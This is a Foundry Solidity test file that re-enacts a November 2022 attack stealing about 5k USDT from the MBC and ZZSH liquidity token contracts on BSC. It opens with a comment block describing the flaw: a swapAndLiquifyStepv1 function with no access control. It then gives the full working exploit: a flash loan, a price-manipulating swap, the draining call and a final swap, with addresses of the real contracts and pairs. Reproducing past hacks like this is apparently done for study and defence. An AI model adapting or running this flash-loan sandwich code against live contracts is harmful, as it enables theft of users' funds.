// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';

import {IUniswapV2Pair} from '../utils/IUniswapV2Pair.sol';


// forge test --match-contract Exploit_MBCToken -vvv
/*
On Nov 29, 2022 an attacker stole ~$5k in USDT tokens from MoonBirds and ZZSH Liquidity Tokens.
The attacker exploited the liquidity tokens contract by sandwich attacking a non access controlled liquify function.

// Attack Overview
Total Lost: ~5k USDT
Attack Tx: https://bscscan.com/tx/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/binance/0xdc53a6b5bf8e2962cf0e0eada6451f10956f4c0845a3ce134ddb050365f15c86

Exploited Contract - MBC: https://bscscan.com/address/0x4E87880A72f6896E7e0a635A5838fFc89b13bd17
Exploited Contract - ZZSH: https://bscscan.com/address/0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6

Attacker Address: https://bscscan.com/address/0x9cc3270de4a3948449c1a73eabff5d0275f60785
Attacker Contract: https://bscscan.com/address/0x0b13D2B0d8571C3e8689158F6DB1eedf6E9602d3
Attack Block: 23474461 

// Key Info Sources
Twitter: https://twitter.com/AnciliaInc/status/1597742575623888896
Code: https://bscscan.com/address/0x4E87880A72f6896E7e0a635A5838fFc89b13bd17#code


Principle: Non access controlled draining function, Sandwich Attack
    
    function swapAndLiquifyStepv1() public {
        uint256 ethBalance = ETH.balanceOf(address(this));
        uint256 tokenBalance = balanceOf(address(this));
        addLiquidityUsdt(tokenBalance, ethBalance);
    }

    function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {
        uniswapV2Router.addLiquidity(
            address(_baseToken),
			address(this),
            usdtAmount,
            tokenAmount,
            0,
            0,
            _tokenOwner,
            block.timestamp
        );
    }
VULN
0) The LiqToken contract holds stablecoin balance.
The swapAndLiquifyStepv1:
1) Reads the balance of the LiqToken contract accepting any pair price.
2) Is not access controlled, meaning that anyone could call it manipulating both the LiqToken and the Pair balances.

ATTACK:
Essentially, a sandwich attack.
1) Request a flashloan and manipulate the price of the UniswapV2 (Pancake pool).
2) Call swapAndLiquifyStepv1() to drain the LiqToken contract forcing it to accept the manipulated price.
3) Swap again for a discounted price (because the Pair has more liquidity after draining the LiqToken contract)

MITIGATIONS:
1) Evaluate if functions capable of draining a contract should be access controlled. 

*/
interface IDppOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address _assetTo, bytes memory data) external;
}

interface ILiqToken is IERC20 {
    function swapAndLiquifyStepv1() external;
}

contract Exploit_MBCToken is TestHarness, TokenBalanceTracker {
    IDppOracle internal dppOracle = IDppOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    
    IERC20 internal usdt = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ILiqToken internal mbc = ILiqToken(0x4E87880A72f6896E7e0a635A5838fFc89b13bd17);
    ILiqToken internal zzsh = ILiqToken(0xeE04a3f9795897fd74b7F04Bb299Ba25521606e6);

    ILiqToken[] internal liqTokens = [mbc, zzsh];

    IUniswapV2Pair internal pairUsdtMbc = IUniswapV2Pair(0x5b1Bf836fba1836Ca7ffCE26f155c75dBFa4aDF1);
    IUniswapV2Pair internal pairUsdtZzsh = IUniswapV2Pair(0x33CCA0E0CFf617a2aef1397113E779E42a06a74A);

    IUniswapV2Pair[] internal pairs = [pairUsdtMbc, pairUsdtZzsh];

    function setUp() external{
        cheat.createSelectFork('bsc', 23474460);
        cheat.deal(address(this), 0);

        addTokenToTracker(address(usdt));
        addTokenToTracker(address(mbc));
        addTokenToTracker(address(zzsh));

        updateBalanceTracker(address(this));
        updateBalanceTracker(address(pairUsdtZzsh));
        updateBalanceTracker(address(pairUsdtMbc));
        updateBalanceTracker(address(mbc));
        updateBalanceTracker(address(zzsh));
    }

    function test_attack() external  {
        console.log('===== STEP 1: REQUEST FLASHLOAN =====');

        dppOracle.flashLoan(0, usdt.balanceOf(address(dppOracle)), address(this), hex'30');
    }

    function DPPFlashLoanCall(address arg0, uint256 arg1, uint256 arg2, bytes memory ) external {
        require(msg.sender == address(dppOracle), 'Only oracle');
        require(arg0 == address(this), 'Only requested by this');

        uint256 usdtReceived = arg1 > 0 ? arg1 : arg2;

        console.log('===== STEP 2: FLASHLOAN RECEIVED =====');
        logBalancesWithLabel('Attacker Contract', address(this));
        
        console.log('===== STEP 3: START MANIPULATION =====');
        uint256 lenTokens = liqTokens.length;
        for(uint256 i = 0; i< lenTokens; i++){
            // if(i == 1) continue;
            IUniswapV2Pair curPair = pairs[i];
            ILiqToken curLiqToken = liqTokens[i];

            usdt.transfer(address(curPair), 150000 ether);

            // For the first part, we drain MBC tokens
            (uint112 reserve0, uint112 reserve1, ) = curPair.getReserves();

            if(i == 0) {
                console.log('===== MBC SWAP =====');
                curPair.swap(reserve0 * 930 / 1000, 0, address(this), '');
            }

            if(i == 1) {
                console.log('===== ZZSH SWAP =====');
                curPair.swap(0, reserve1 * 918 / 1000, address(this), '');
            }

            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));
            
            console.log('===== LIQ TOKEN SWAP AND LIQUIFY =====');
            curLiqToken.swapAndLiquifyStepv1();

            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));

            curPair.sync();

            console.log('===== TRANSFER USDT and LIQ TOKEN TO PAIR =====');
            usdt.transfer(address(curPair), 1001);
            curLiqToken.transfer(address(curPair), curLiqToken.balanceOf(address(this)));
            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));

            console.log('===== DRAIN PAIR =====');
            uint256 amountToDrain;

            if(i == 0) {
                amountToDrain = usdt.balanceOf(address(curPair)) * 912 / 1000; // ninedec
                curPair.swap(0, amountToDrain, address(this), '');
            }

            if(i == 1) {
                amountToDrain = usdt.balanceOf(address(curPair)) * 910 / 1000;
                curPair.swap(amountToDrain, 0, address(this), '');
            }

            logBalancesWithLabel('Attacker Contract', address(this));
            logBalancesWithLabel(curLiqToken.name(), address(curLiqToken));
            logBalancesWithLabel('Current Pair', address(curPair));
        }
        console.log('===== REPAYING LOAN =====');
        require(usdt.transfer(address(dppOracle), usdtReceived));
        logBalancesWithLabel('Attacker Contract', address(this));       
    }
}